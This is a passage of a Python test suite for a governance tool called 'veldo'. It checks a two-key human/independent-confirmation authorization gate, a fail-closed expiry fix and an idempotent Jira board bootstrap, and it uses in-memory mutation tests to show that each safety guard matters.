expect("WARP-1207 TEETH: neutralizing the self-separation guard lets a self-authored confirmation THROUGH (the guard is load-bearing)",
       _r_real == TK.CONFIRMATION_NOT_INDEPENDENT and _r_mut is None)

# TOOTH 2 - the human-authorization digest binding: neutralize it and a foreign-digest KEY 1 authorizes.
_tk_foreignh = dict(_tk_human, proposal_digest="sha256:0000000000000000")
_r2_real = TK.authorize(_tk_remedy, _tk_dig, _tk_foreignh, _tk_conf, executor_actor="svc-executor", now=_TK_NOW)[0]
_g2 = _tk_mut(_tk_src.replace("if _digest_of(human_authorization) != digest:",
                              "if False and _digest_of(human_authorization) != digest:"))
_r2_mut = _g2["authorize"](_tk_remedy, _tk_dig, _tk_foreignh, _tk_conf, executor_actor="svc-executor", now=_TK_NOW)[0]
expect("WARP-1207 TEETH: neutralizing the human-authorization digest binding lets a FOREIGN-digest KEY 1 THROUGH",
       _r2_real == TK.FOREIGN_AUTHORIZATION and _r2_mut is None)

# TOOTH 3 - the KEY 1 machine-actor guard: neutralize it and a machine-authored authorization authorizes.
_tk_machh = dict(_tk_human, approver="veldo-executor")
_r3_real = TK.authorize(_tk_remedy, _tk_dig, _tk_machh, _tk_conf, executor_actor="svc-executor", now=_TK_NOW)[0]
_g3 = _tk_mut(_tk_src.replace("if _norm(approver) in MACHINE_ACTORS:",
                              "if False and _norm(approver) in MACHINE_ACTORS:"))
_r3_mut = _g3["authorize"](_tk_remedy, _tk_dig, _tk_machh, _tk_conf, executor_actor="svc-executor", now=_TK_NOW)[0]
expect("WARP-1207 TEETH: neutralizing the KEY 1 machine-actor guard lets a MACHINE-authored authorization THROUGH",
       _r3_real == TK.SELF_AUTHORIZATION and _r3_mut is None)
expect("WARP-1207 TEETH: all guard mutations were in-memory only (the real two_key.py on disk is byte-unchanged)",
       (ROOT / ".veldo/two_key.py").read_text() == _tk_src)

# The gate is a PURE function - a malformed CALL (no digest) raises by name, never silently no-ops.
try:
    TK.authorize(_tk_remedy, "", _tk_human, _tk_conf)
    _tk_raised = False
except TK.TwoKeyError:
    _tk_raised = True
expect("WARP-1207: the gate RAISES by name on a malformed call (no proposal digest), never a silent no-op",
       _tk_raised)

# Drift guards: the both-absent fence value and the human-key machine set mirror the executor's, so
# they cannot drift apart across the two organs.
expect("WARP-1207: TK.REQUIRES_TWO_KEY mirrors action_executor.REFUSE_REQUIRES_TWO_KEY (no drift on the both-absent fence)",
       TK.REQUIRES_TWO_KEY == AE.REFUSE_REQUIRES_TWO_KEY)
expect("WARP-1207: TK.MACHINE_ACTORS mirrors action_executor.MACHINE_ACTORS (no drift on the human-key machine set)",
       TK.MACHINE_ACTORS == AE.MACHINE_ACTORS)

# NG3 IN-SESSION only, no detached process, mirroring the sibling organs.
_tk_src2 = (ROOT / ".veldo/two_key.py").read_text()
expect("WARP-1207 NG3: two_key.py starts no detached/background process (no subprocess/Popen/threading/asyncio/setsid/claude -p)",
       not any(t in _tk_src2 for t in _TRIP_DETACH_TOKENS))
expect("WARP-1207 NG3: two_key.py imports no process/thread machinery at module scope (pathlib/json; importlib lazily in the demo)",
       "import subprocess" not in _tk_src2 and "import threading" not in _tk_src2
       and "import multiprocessing" not in _tk_src2 and "import asyncio" not in _tk_src2)
_tk_mut_popen = _tk_src2 + '\nimport subprocess as _s\n_p = _s.Popen(["claude", "-p", "x"], start_new_session=True)\n'
expect("WARP-1207 NG3 TEETH: a detached subprocess.Popen(claude -p) mutation turns the no-detach check RED",
       any(t in _tk_mut_popen for t in _TRIP_DETACH_TOKENS))
expect("WARP-1207 NG3: the no-detach mutation is in-memory only (the real module on disk is byte-unchanged)",
       (ROOT / ".veldo/two_key.py").read_text() == _tk_src2)

# AC byte-identical engine sync across root, engine, and all 6 packs (two_key.py; the
# action_executor.py and capabilities.yaml byte-identity is asserted in the WARP-1206 block over the
# W7-edited copies).
expect("WARP-1207: .veldo/two_key.py is byte-identical root vs engine",
       (ROOT / ".veldo/two_key.py").read_bytes() == (ROOT / "engine/.veldo/two_key.py").read_bytes())
expect("WARP-1207: .veldo/two_key.py is byte-identical across all 6 packs",
       (ROOT / ".veldo/two_key.py").read_bytes() == (ROOT / "engine/.veldo/two_key.py").read_bytes())
expect("WARP-1207: the two_key_rule capability is declared mechanical with home .veldo/two_key.py",
       bool(re.search(r"(?m)^\s{2}two_key_rule:\s*\{status:\s*mechanical,\s*home:\s*\.veldo/two_key\.py\b", (ROOT / ".veldo/capabilities.yaml").read_text())))

# Dogfood: this spec OPENS the data-mutating execution path, so it is CRITICAL (C2) - two independent
# reviews plus a recorded founder approval to land - and ships at human_approval REQUIRED, placement
# resolves, and no protected path is touched.
_p1207_fm = V.parse_yamlish(re.match(r"^---\n(.*?)\n---", (ROOT / "specs/WARP-1207-the-two-key-rule.md").read_text(), re.S).group(1))
_p1207_arch, _p1207_contract = V.load_repo_contract(repo_root=str(ROOT))
expect("WARP-1207 dogfood: the spec placement resolves and passes the mandatory placement gate (tier standard, no boundary crossing)",
       _p1207_contract is not None and _p1207_arch.placement_gate(_p1207_fm, _p1207_contract) == []
       and _p1207_arch.footprint_tier_floor(_p1207_fm, _p1207_contract) == "")
expect("WARP-1207 dogfood: CRITICAL RISK and human_approval REQUIRED (C2, it opens the data-mutating execution path), and no protected path is touched",
       _p1207_arch._risk_word(_p1207_fm.get("risk")) == "critical" and _p1207_fm.get("human_approval") == "required"
       and (_p1207_fm.get("protected_paths") or []) == [])

# --- WARP-1212 (hardening of PLAN-0012 W7): two-key freshness FAILS CLOSED when no clock ------------
# The WARP-1207 reviews (verdict.json + verdict-2.json) BOTH flagged a latent fail-OPEN: authorize()
# and execute() default now=None, and _expired() returned False for a key that DECLARES an expiry (even
# a PAST one) when no clock was injected - so an expired-but-declared key PASSED the freshness check
# with no clock. The fix (WARP-1212) makes _expired fail CLOSED: a declared expiry that cannot be
# verified for want of a clock is treated as expired and REFUSES, so a clock is required on the two-key
# path and an expired-or-unverifiable-freshness key can NEVER authorize regardless of whether a clock
# was passed. The reuse the W7 fixtures (_tk_remedy/_tk_dig/_tk_human/_tk_conf/_tk_run/_TK_NOW/TK/AE).
# POSITIVE CONTROLS (behavior preserved; the fix is a tightening, not a redesign): a valid unexpired
# pair WITH a clock still executes both keys, and the with-a-clock expired / no-expiry refusals are
# unchanged.
_tk1212_fake = AE.FakeActionSystem()
expect("WARP-1212 positive: a valid unexpired pair WITH a clock still AUTHORIZES and EXECUTES both keys (W7 success preserved)",
       _tk_run(fake=_tk1212_fake, now=_TK_NOW).get("executed") is True and [o["op"] for o in _tk1212_fake.ops] == ["canary", "action"])
expect("WARP-1212 positive: an EXPIRED human authorization WITH a clock still REFUSES (unchanged)",
       _tk_run(human=dict(_tk_human, expires_at="2020-01-01T00:00:00Z"), now=_TK_NOW).get("refused") == TK.AUTHORIZATION_EXPIRED)
expect("WARP-1212 positive: a human authorization declaring NO expiry WITH a clock still REFUSES (unchanged)",
       _tk_run(human={k: v for k, v in _tk_human.items() if k != "expires_at"}, now=_TK_NOW).get("refused") == TK.AUTHORIZATION_EXPIRED)

# THE ANTI-VACUITY FIX (C3, the reviewers' exact finding): an EXPIRED-but-declared key with NO clock
# now REFUSES by name (before WARP-1212 it PASSED the freshness check and authorized).
expect("WARP-1212 FIX: an EXPIRED-but-declared human authorization with NO clock now REFUSES (authorization_expired); before, it PASSED",
       _tk_run(human=dict(_tk_human, expires_at="2020-01-01T00:00:00Z"), now=None).get("refused") == TK.AUTHORIZATION_EXPIRED)
# _expired is the ONE freshness helper authorize() applies to BOTH keys, so the confirmation side is
# hardened identically (through the full gate KEY 1 is checked first and shields KEY 2 when there is no
# clock, so the confirmation-side fix is proven at the shared helper). Fresh ONLY with a real clock
# proving a declared expiry is in the future; expired, no-expiry, and unverifiable-no-clock all fail closed.
expect("WARP-1212 FIX: _expired fails closed for a confirmation-shaped key with NO clock - expired-declared and valid-unexpired both unverifiable (True), fresh only WITH a clock",
       TK._expired(dict(_tk_conf, expires_at="2020-01-01T00:00:00Z"), None) is True
       and TK._expired(_tk_conf, None) is True
       and TK._expired(_tk_conf, _TK_NOW) is False)
expect("WARP-1212 FIX: an EXPIRED-but-declared independent confirmation WITH a clock still REFUSES (confirmation_expired) - the KEY 2 path is unchanged with a clock",
       _tk_run(conf=dict(_tk_conf, expires_at="2020-01-01T00:00:00Z"), now=_TK_NOW).get("refused") == TK.CONFIRMATION_EXPIRED)
# THE STRONGER GUARANTEE: a clock is REQUIRED on the two-key path - even a valid unexpired key with no
# clock refuses (its declared expiry is unverifiable), so freshness can never be silently disabled.
expect("WARP-1212 FIX: even a VALID unexpired human key with NO clock REFUSES (authorization_expired) - a clock is required on the two-key path",
       _tk_run(now=None).get("refused") == TK.AUTHORIZATION_EXPIRED)
# THE EXECUTOR SURFACE (the reviewers' direct probe): execute(...expired human..., now=None) used to
# return executed True; it now fails closed to a named refusal with no run.
expect("WARP-1212 FIX at the executor surface: execute(expired human, now=None) is executed=False and refused=authorization_expired (was executed=True)",
       (lambda r: r.get("executed") is False and r.get("refused") == TK.AUTHORIZATION_EXPIRED)(
           _tk_run(human=dict(_tk_human, expires_at="2020-01-01T00:00:00Z"), now=None)))

# THE LOAD-BEARING TOOTH (C1, anti-vacuity): reverting the fix line to the pre-WARP-1212 `return False`
# in an IN-MEMORY copy makes the expired-no-clock key AUTHORIZE again (reason None), while the real
# module on disk REFUSES it - proving the one-line fix is load-bearing. The real module is byte-unchanged.
_tk1212_expired_h = dict(_tk_human, expires_at="2020-01-01T00:00:00Z")
_r1212_real = TK.authorize(_tk_remedy, _tk_dig, _tk1212_expired_h, _tk_conf, executor_actor="svc-executor", now=None)[0]
_g1212 = _tk_mut(_tk_src.replace(
    "        return True  # WARP-1212: no clock to verify a declared expiry -> fail closed (refuse), never open",
    "        return False"))
_r1212_reverted = _g1212["authorize"](_tk_remedy, _tk_dig, _tk1212_expired_h, _tk_conf, executor_actor="svc-executor", now=None)[0]
expect("WARP-1212 TEETH: reverting the freshness fix lets an EXPIRED-but-declared key with NO clock THROUGH (the fix line is load-bearing)",
       _r1212_real == TK.AUTHORIZATION_EXPIRED and _r1212_reverted is None)
# The corollary: the reverted (pre-fix) code also authorizes a VALID unexpired pair with no clock,
# while the real module refuses - the fail-open the reviews described in full.
_r1212_valid_real = TK.authorize(_tk_remedy, _tk_dig, _tk_human, _tk_conf, executor_actor="svc-executor", now=None)[0]
_r1212_valid_reverted = _g1212["authorize"](_tk_remedy, _tk_dig, _tk_human, _tk_conf, executor_actor="svc-executor", now=None)[0]
expect("WARP-1212 TEETH: reverting the fix also lets a VALID pair with NO clock authorize (real REFUSES, reverted AUTHORIZES)",
       _r1212_valid_real == TK.AUTHORIZATION_EXPIRED and _r1212_valid_reverted is None)
expect("WARP-1212 TEETH: the revert mutation is in-memory only (the real two_key.py on disk is byte-unchanged)",
       (ROOT / ".veldo/two_key.py").read_text() == _tk_src)

# The neither-key fence is UNCHANGED (the fix never touches the both-absent path: it returns before
# _expired), so W6's canonical requires_two_key value is preserved.
expect("WARP-1212: the neither-key fence is unchanged (requires_two_key, before any freshness check) even with no clock",
       _tk_run(human=None, conf=None, now=None).get("refused") == AE.REFUSE_REQUIRES_TWO_KEY)

# WARP-1212 dogfood: standalone hardening spec (no plan/work), HIGH risk floor per C2 (it edits the
# two-key organ) with human_approval REQUIRED, and no protected path touched. It is HIGH not CRITICAL:
# a pure fail-closed tightening that removes a fail-open and can only ever REFUSE more, never open or
# widen any execution path (the CRITICAL trigger, which W7 met by building the data-mutating path).
_p1212_fm = V.parse_yamlish(re.match(r"^---\n(.*?)\n---", (ROOT / "specs/WARP-1212-two-key-freshness-fail-closed.md").read_text(), re.S).group(1))
expect("WARP-1212 dogfood: risk floor at least HIGH with human_approval REQUIRED (C2, it edits the two-key organ), and no protected path touched",
       _p1207_arch._risk_word(_p1212_fm.get("risk")) in ("high", "critical") and _p1212_fm.get("human_approval") == "required"
       and (_p1212_fm.get("protected_paths") or []) == [])
expect("WARP-1212 dogfood: standalone lane (no plan/work fields), mirroring WARP-0113/WARP-0114 hardening specs",
       not _p1212_fm.get("plan") and not _p1212_fm.get("work"))

# --- Jira board bootstrap `veldo jira init` (WARP-0612): a codified, generic, idempotent bootstrap that
# stands a company-managed Jira project up as the live board (statuses + workflow provisioned) and then
# REUSES the shipped mirror to project every plan/spec onto it. Load-bearing properties, all proven over
# the deterministic FakeTracker offline (no network): GENERIC (config by reference, no hardcode), DETECT-
# FIRST-FAIL-LOUD on a team-managed project (never a half-board), IDEMPOTENT provisioning (create-or-reuse
# by name, wire-if-absent), and the reused mirror forks nothing on replay. Anti-vacuity teeth mutate the
# real module source in-memory and show a refused case slips through, the real module byte-unchanged.
import re
_jispec = importlib.util.spec_from_file_location("veldo_tracker_jira_init", ROOT / ".veldo/tracker_jira_init.py")
JI = importlib.util.module_from_spec(_jispec); _jispec.loader.exec_module(JI)

_ji_cfg = {"schema": "veldo.tracker/v1",
           "routing": {"mechanism": "label", "label_prefix": "veldo-repo:"},
           "status_map": {"ready": "Ready", "blocked": "Blocked", "in_review": "In Review", "shipped": "Shipped"},
           "repos": [{"id": "repo-a", "tracker": "jira", "project": "PROJ"}],
           "bootstrap": {"project_key": "PROJ", "issue_types": ["Epic", "Task"]}}

# AC1: GENERIC config, validated fail-closed by name. A valid block resolves to the full lifecycle set
# (9 statuses from the default), and four malformed blocks each raise BootstrapError. Non-tautology: the
# SAME resolver accepts the valid block and refuses each malformed one.
_ji_bc = JI.resolve_bootstrap_config(_ji_cfg)
expect("jira init: a valid bootstrap block resolves to the full lifecycle status set (default nine)",
       _ji_bc is not None and len(_ji_bc["statuses"]) == 9 and _ji_bc["project_key"] == "PROJ")
expect("jira init: a config with no bootstrap block is not wired (None), not an error",
       JI.resolve_bootstrap_config({"schema": "veldo.tracker/v1", "routing": {}, "repos": []}) is None)
_ji_bad = [
    {"bootstrap": {"project_key": "", "issue_types": ["Epic"]}},                                   # blank project key
    {"bootstrap": {"project_key": "P", "statuses": []}},                                           # empty statuses
    {"bootstrap": {"project_key": "P", "statuses": [{"name": "X", "category": "Nope"}]}},          # bad category
    {"bootstrap": {"project_key": "P", "issue_types": []}},                                        # empty issue types
]
_ji_bad_refused = 0
for _bad in _ji_bad:
    _bad_cfg = dict(_ji_cfg); _bad_cfg["bootstrap"] = _bad["bootstrap"]
    try:
        JI.resolve_bootstrap_config(_bad_cfg)
    except JI.BootstrapError:
        _ji_bad_refused += 1
expect("jira init: every malformed bootstrap block fails closed by name (BootstrapError)", _ji_bad_refused == 4)
_ji_text = (ROOT / ".veldo/tracker_jira_init.py").read_text()
expect("jira init AC1: the module hardcodes no company/board config value (Bcengi/Dejitech/atlassian host)",
       not re.search(r"(?i)bcengi|dejitech|\.atlassian\.net", _ji_text))

# AC3: IDEMPOTENT provisioning on a fresh company-managed board - all nine statuses created and each wired
# into both issue types; a re-run creates nothing, wires nothing, and leaves the board byte-identical.
_ji_ft = TA.FakeTracker(); _ji_ft.seed_project("PROJ", "company-managed")
_ji_r1 = JI.provision_board(_ji_ft, _ji_cfg)
expect("jira init: a fresh board provisions all nine statuses and wires each into both issue types",
       _ji_r1["created"] == 9 and _ji_r1["wired"] == 18 and len(_ji_ft.project_snapshot("PROJ")["statuses"]) == 9)
_ji_before = _ji_ft.state_digest()
_ji_r2 = JI.provision_board(_ji_ft, _ji_cfg)
expect("jira init: a re-run creates nothing and wires nothing (idempotent), board byte-identical",
       _ji_r2["created"] == 0 and _ji_r2["wired"] == 0 and _ji_r2["reused"] == 9
       and _ji_r2["already_wired"] == 18 and _ji_ft.state_digest() == _ji_before)

# AC3: a PARTIAL board - missing statuses CREATED, present ones REUSED (never silently skipped). Before:
# only two present; after: all nine present, created == the seven that were absent. Non-tautology: the
# SAME nine-status config yields created 9 on an empty board and created 7 here (tracks the real gap).
_ji_part = TA.FakeTracker(); _ji_part.seed_project("PROJ", "company-managed", statuses=["Backlog", "Ready"])
_ji_before_names = set(_ji_part.existing_status_names("PROJ"))
_ji_rp = JI.provision_board(_ji_part, _ji_cfg)
_ji_after_names = set(_ji_part.existing_status_names("PROJ"))
_ji_configured = {s["name"] for s in _ji_bc["statuses"]}
expect("jira init: a partial board creates the MISSING statuses and reuses the present ones (never skipped)",
       _ji_before_names == {"Backlog", "Ready"} and _ji_configured <= _ji_after_names
       and _ji_rp["created"] == 7 and _ji_rp["reused"] == 2 and {"Awaiting Approval", "Shipped", "Rejected"} <= _ji_after_names)

# AC2: a TEAM-MANAGED project FAILS LOUD by name and provisions NOTHING (detection precedes any write).
_ji_tm = TA.FakeTracker(); _ji_tm.seed_project("PROJ", "team-managed")
_ji_tm_msg = None
try:
    JI.provision_board(_ji_tm, _ji_cfg)
except JI.BootstrapError as _ex:
    _ji_tm_msg = str(_ex)
expect("jira init AC2: a team-managed project fails loud naming the project, the type, and the remediation",
       _ji_tm_msg is not None and "PROJ" in _ji_tm_msg and "team-managed" in _ji_tm_msg and "company-managed" in _ji_tm_msg)
expect("jira init AC2: the failed detection provisions NOTHING (no half-board)",
       len(_ji_tm.project_snapshot("PROJ")["statuses"]) == 0)

# AC2 TEETH: neutralize the project-type check in an in-memory copy of the module and a team-managed board
# gets fully provisioned, while the real module refuses - so the fail-loud is load-bearing, not decorative.
def _ji_mut(src):
    g = {"__file__": str(ROOT / ".veldo/tracker_jira_init.py")}
    exec(compile(src, "<jira_init_mut>", "exec"), g)
    return g
_ji_gmut = _ji_mut(_ji_text.replace("    if actual != required:", "    if False and actual != required:"))
_ji_tm2 = TA.FakeTracker(); _ji_tm2.seed_project("PROJ", "team-managed")
_ji_gmut["provision_board"](_ji_tm2, _ji_cfg)
expect("jira init AC2 TEETH: removing the project-type check lets a team-managed board be provisioned (real refuses, mutated proceeds)",
       len(_ji_tm2.project_snapshot("PROJ")["statuses"]) == 9)
expect("jira init AC2 TEETH: the detection mutation is in-memory only (the module on disk is byte-unchanged)",
       (ROOT / ".veldo/tracker_jira_init.py").read_text() == _ji_text)

# AC3 TEETH: neutralize the FakeTracker create-or-reuse guard in an in-memory copy and a re-run DUPLICATES
# (created 9 again), while the real create-or-reuse stays a no-op (created 0) - the idempotency is real.
_ta_src = (ROOT / ".veldo/tracker_adapter.py").read_text()
_ta_dupg = {}
exec(compile(_ta_src.replace("        if name in statuses:\n            return statuses[name], False",
                             "        if False and name in statuses:\n            return statuses[name], False"),
             "<tracker_adapter_mut>", "exec"), _ta_dupg)
_ji_dupft = _ta_dupg["FakeTracker"](); _ji_dupft.seed_project("PROJ", "company-managed")
JI.provision_board(_ji_dupft, _ji_cfg)
_ji_dup2 = JI.provision_board(_ji_dupft, _ji_cfg)
expect("jira init AC3 TEETH: removing create-or-reuse makes a re-run DUPLICATE (created 9), real stays idempotent (created 0)",
       _ji_dup2["created"] == 9 and _ji_r2["created"] == 0)
expect("jira init AC3 TEETH: the fake-tracker mutation is in-memory only (tracker_adapter.py on disk byte-unchanged)",
       (ROOT / ".veldo/tracker_adapter.py").read_text() == _ta_src)

# AC3: provisioning respects the read/write audit contract - reads are side-effect-free, the two writes
# (provision_status, wire_status_into_workflow) are recorded; no read ever appears in the audit.
_ji_audit = TA.FakeTracker(); _ji_audit.seed_project("PROJ", "company-managed")
_ji_a0 = len(_ji_audit.writes())
_ji_audit.project_type("PROJ"); _ji_audit.existing_status_names("PROJ"); _ji_audit.workflow_status_names("PROJ", "Epic"); _ji_audit.existing_issue_types("PROJ")
expect("jira init: provisioning reads are side-effect-free (write audit unchanged)", len(_ji_audit.writes()) == _ji_a0)
JI.provision_board(_ji_audit, _ji_cfg)
_ji_aud_ops = {w["op"] for w in _ji_audit.writes()}
expect("jira init: provisioning writes are audited (provision_status + wire_status_into_workflow recorded, reads never)",
       {"provision_status", "wire_status_into_workflow"} == _ji_aud_ops)

# AC7: ISSUE-TYPE provisioning - ensure the configured issue types exist (add missing, reuse present),
# BEFORE statuses/wiring/mirror, and NEVER fall back to a wrong type. "Add types if they are missing,
# don't use wrong types." A project missing the epic type has it ADDED (created); a project already
# holding both is a no-op (reused, no dup); a configured type absent from the INSTANCE catalog FAILS
# LOUD by name (never invented, never mapped to a wrong type). Two anti-vacuity teeth mutate the guards.

# create-if-missing: a company-managed project that LACKS Epic (has only Task) but whose instance HOLDS
# Epic gets Epic ADDED (created 1), Task reused; a re-run adds nothing and is byte-identical.
_ji_mit = TA.FakeTracker(); _ji_mit.seed_project("PROJ", "company-managed", issue_types=["Task"], instance_issue_types=["Epic"])
_ji_rmit = JI.provision_board(_ji_mit, _ji_cfg)
expect("jira init AC7: a project missing the epic type has it ADDED (created 1), the present one reused",
       _ji_rmit["issue_types_created"] == 1 and _ji_rmit["issue_types_reused"] == 1
       and "Epic" in _ji_mit.existing_issue_types("PROJ"))
_ji_mit_dig = _ji_mit.state_digest()
_ji_rmit2 = JI.provision_board(_ji_mit, _ji_cfg)
expect("jira init AC7: re-running after adding the missing type adds nothing (idempotent), byte-identical",
       _ji_rmit2["issue_types_created"] == 0 and _ji_rmit2["issue_types_reused"] == 2
       and _ji_mit.state_digest() == _ji_mit_dig)

# positive control: a project already holding BOTH configured types is a pure no-op (reused 2, created 0).
_ji_hit = TA.FakeTracker(); _ji_hit.seed_project("PROJ", "company-managed", issue_types=["Epic", "Task"])
_ji_rhit = JI.provision_board(_ji_hit, _ji_cfg)
expect("jira init AC7: a project already having both issue types adds none (reused 2, created 0)",
       _ji_rhit["issue_types_created"] == 0 and _ji_rhit["issue_types_reused"] == 2)

# ordering: issue types are provisioned BEFORE any status is provisioned or wired (audit order proves it).
_ji_ord = TA.FakeTracker(); _ji_ord.seed_project("PROJ", "company-managed", issue_types=[], instance_issue_types=["Epic", "Task"])
JI.provision_board(_ji_ord, _ji_cfg)
_ji_ordops = [w["op"] for w in _ji_ord.writes()]
expect("jira init AC7: issue types are provisioned BEFORE statuses are provisioned/wired (audit order)",
       "provision_issue_type" in _ji_ordops
       and _ji_ordops.index("provision_issue_type") < _ji_ordops.index("provision_status")
       and _ji_ordops.index("provision_issue_type") < _ji_ordops.index("wire_status_into_workflow"))

# fail-loud: a configured type ABSENT from the instance catalog is refused by name (never a wrong-type
# fallback). Here the project has only Task and the instance holds only Task, so Epic cannot be added.
_ji_noit = TA.FakeTracker(); _ji_noit.seed_project("PROJ", "company-managed", issue_types=["Task"])
_ji_noit_msg = None
try:
    JI.provision_board(_ji_noit, _ji_cfg)
except TA.TrackerItemNotFound as _ex:
    _ji_noit_msg = str(_ex)
expect("jira init AC7: a configured type absent from the instance FAILS LOUD by name (never a wrong-type fallback)",
       _ji_noit_msg is not None and "Epic" in _ji_noit_msg)

# AC7 TEETH A (create-if-missing): neutralize the FakeTracker's add-the-missing-type write in an in-memory
# copy; the mutated fake leaves Epic ABSENT while the real fake adds it, so create-if-missing is load-bearing.
_ta_it_src = (ROOT / ".veldo/tracker_adapter.py").read_text()
_ta_addg = {}
exec(compile(_ta_it_src.replace("        types.add(name)\n        return self._issue_type_id(project_key, name), True",
                                "        return self._issue_type_id(project_key, name), True"),
             "<tracker_adapter_addmut>", "exec"), _ta_addg)
_ji_mutadd = _ta_addg["FakeTracker"](); _ji_mutadd.seed_project("PROJ", "company-managed", issue_types=["Task"], instance_issue_types=["Epic"])
JI.provision_board(_ji_mutadd, _ji_cfg)
expect("jira init AC7 TEETH A: neutralizing the add-missing-type write leaves Epic ABSENT (real adds it, mutated does not)",
       "Epic" not in _ji_mutadd.existing_issue_types("PROJ") and "Epic" in _ji_mit.existing_issue_types("PROJ"))
expect("jira init AC7 TEETH A: the mutation is in-memory only (tracker_adapter.py on disk byte-unchanged)",
       (ROOT / ".veldo/tracker_adapter.py").read_text() == _ta_it_src)

# AC7 TEETH B (fail-loud / never invent): neutralize the "not in instance catalog" guard in an in-memory
# copy; the mutated fake INVENTS a type the instance does not hold, while the real fake refuses by name -
# so the never-a-wrong-type fail-loud is load-bearing, not decorative.
_ta_invg = {}
exec(compile(_ta_it_src.replace("        if name not in self._instance_issue_types:",
                                "        if False and name not in self._instance_issue_types:"),
             "<tracker_adapter_invmut>", "exec"), _ta_invg)
_ji_mutinv = _ta_invg["FakeTracker"](); _ji_mutinv.seed_project("PROJ", "company-managed", issue_types=["Task"])
try:
    JI.provision_board(_ji_mutinv, _ji_cfg)
    _ji_invented = "Epic" in _ji_mutinv.existing_issue_types("PROJ")
except Exception:
    _ji_invented = False
expect("jira init AC7 TEETH B: neutralizing the fail-loud lets a type absent from the instance be INVENTED (real refuses, mutated proceeds)",
       _ji_invented is True and _ji_noit_msg is not None)
expect("jira init AC7 TEETH B: the mutation is in-memory only (tracker_adapter.py on disk byte-unchanged)",
       (ROOT / ".veldo/tracker_adapter.py").read_text() == _ta_it_src)

# AC7 seam: existing_issue_types is read-only, and provision_issue_type is recorded in the audit ONLY when
# it actually attached a type (a reuse records nothing) - the seam's audit contract holds for issue types.
_ji_itaud = TA.FakeTracker(); _ji_itaud.seed_project("PROJ", "company-managed", issue_types=["Task"], instance_issue_types=["Epic"])
_ji_ita0 = len(_ji_itaud.writes()); _ji_itaud.existing_issue_types("PROJ")
expect("jira init AC7: existing_issue_types is side-effect-free (write audit unchanged)", len(_ji_itaud.writes()) == _ji_ita0)
_ji_itaud.provision_issue_type("PROJ", "Task"); _ji_itaud.provision_issue_type("PROJ", "Epic")
_ji_itops = [w["op"] for w in _ji_itaud.writes()]
expect("jira init AC7: provision_issue_type is audited only when it attaches a type (reuse records nothing)",
       _ji_itops.count("provision_issue_type") == 1)

# AC4: the full bootstrap REUSES the shipped mirror (run_from_repo -> mirror_events/mirror_plan_events) to
# project a plan onto an epic and a spec onto a child, and a re-run FORKS NO epic/child and leaves state
# byte-identical (the mirror's idempotent upsert, driven by the SAME provisioner). No mirror logic here.
_ji_sidx = {"WARP-9601": {"id": "WARP-9601", "plan": "PLAN-0006", "work": "W1", "tracker_repo": "repo-a",
                          "title": "a mirrored spec", "reporter": "rep"}}
_ji_pidx = {"PLAN-0006": {"id": "PLAN-0006", "title": "a plan", "tracker_repo": "repo-a", "status": "ready",
                          "work": [{"item": "W1", "spec": "WARP-9601", "title": "a mirrored spec", "spec_status": "ready"}]}}
_ji_events = [{"id": "e1", "type": "spec.ready", "correlation_id": "WARP-9601", "at": "2026-01-01T00:00:00Z"},
              {"id": "p1", "type": "plan.created", "correlation_id": "PLAN-0006", "at": "2026-01-01T00:00:00Z"}]
_ji_bft = TA.FakeTracker(); _ji_bft.seed_project("PROJ", "company-managed")
_ji_brep = JI.bootstrap(_ji_bft, config=_ji_cfg, read_events=lambda _p: _ji_events,
                        spec_index=_ji_sidx, plan_index=_ji_pidx)
expect("jira init AC4: bootstrap provisions the board AND mirrors a plan onto an epic + a spec onto a child",
       _ji_brep["provision"]["created"] == 9 and _ji_bft.count(kind="epic") == 1 and _ji_bft.count(kind="child") >= 1)
_ji_bdig = _ji_bft.state_digest()
JI.bootstrap(_ji_bft, config=_ji_cfg, read_events=lambda _p: _ji_events, spec_index=_ji_sidx, plan_index=_ji_pidx)
expect("jira init AC4: re-running the whole bootstrap forks no epic/child and leaves state byte-identical (idempotent)",
       _ji_bft.count(kind="epic") == 1 and _ji_bft.state_digest() == _ji_bdig)

# AC5: the entrypoint is wired into the CLI as `veldo jira init`, guarded repo-only like `veldo mirror`, and
# the --dry-run path runs the WHOLE bootstrap over a FakeTracker and returns 0 (proven over a temp repo).
_ji_veldo = (ROOT / "bin/veldo").read_text()
expect("jira init AC5: veldo jira init is a bin/veldo subcommand, guarded like mirror (existence check)",
       '"jira"' in _ji_veldo and "tracker_jira_init.py" in _ji_veldo and 'cmd == "jira"' in _ji_veldo)
with tempfile.TemporaryDirectory() as _jid:
    (Path(_jid) / ".veldo").mkdir()
    (Path(_jid) / ".veldo" / "trackers.json").write_text(json.dumps(_ji_cfg))
    expect("jira init AC5: veldo jira init --dry-run runs the whole bootstrap over a fake and returns 0",
           JI._cli(["--dry-run", "--repo-root", _jid]) == 0)
    # a repo with no tracker config is a clean no-op (return 0), reported honestly
    _jid2 = Path(_jid) / "empty"; _jid2.mkdir()
    expect("jira init AC5: a repo with no tracker config is a clean no-op (return 0)",
           JI._cli(["--dry-run", "--repo-root", str(_jid2)]) == 0)

# AC5: the live company-managed provisioner is REFERENCE-WIRED and never run here - build_live_provisioner
# FAILS CLOSED by name when no jira-cloud tracker is configured (never guesses a connection).
_ji_live_refused = None
try:
    JI.build_live_provisioner({"schema": "veldo.tracker/v1", "routing": {}, "repos": [], "trackers": {}})
except JI.BootstrapError:
    _ji_live_refused = "refused"
expect("jira init AC5: build_live_provisioner fails closed by name with no jira-cloud tracker configured",
       _ji_live_refused == "refused")
expect("jira init AC5: the live provisioner is a JiraCloudAdapter subclass (reuses auth/_request/upsert)",
       issubclass(JI.JiraCompanyManagedProvisioner, JI.JiraCloudAdapter))

# AC6 dogfood: WARP-0612 is a STANDALONE tracker-lineage spec (no plan/work), STANDARD risk (touches no
# protected path, not in the safety core, footprint stays inside the tracker area), placement [tracker]
# with a footprint, behavior_bearing with observability, and no protected path touched.
_p0612_fm = V.parse_yamlish(re.match(r"^---\n(.*?)\n---", (ROOT / "specs/WARP-0612-jira-init-board-bootstrap.md").read_text(), re.S).group(1))
expect("WARP-0612 dogfood: PLANNED lane bound to PLAN-0016 W1 (the plan file now exists; the validator enforces this binding bidirectionally, refusing a plan whose spec does not declare it back)",
       _p0612_fm.get("lane") == "planned" and _p0612_fm.get("plan") == "PLAN-0016"
       and _p0612_fm.get("work") == "W1" and str(_p0612_fm.get("plan_revision")) == "1")
expect("WARP-0612 dogfood: STANDARD risk with human_approval not required, and no protected path touched",
       _p0612_fm.get("risk", "").split()[0] == "standard" and _p0612_fm.get("human_approval") == "not_required"
